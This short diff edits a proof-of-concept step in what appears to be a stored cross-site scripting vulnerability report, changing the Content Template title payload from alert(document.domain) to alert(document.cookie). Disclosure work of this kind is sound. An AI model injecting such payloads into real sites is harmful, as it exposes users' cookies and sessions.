@@ -15,7 +15,7 @@ Proof of Concept:
 1. Create a new Content Template with title: 
 
    ```js
-   <img src=x onerror=alert(document.domain)>
+   <img src=x onerror=alert(document.cookie)>
    ```
 
    ![image-1](./screenshots/test1.png)
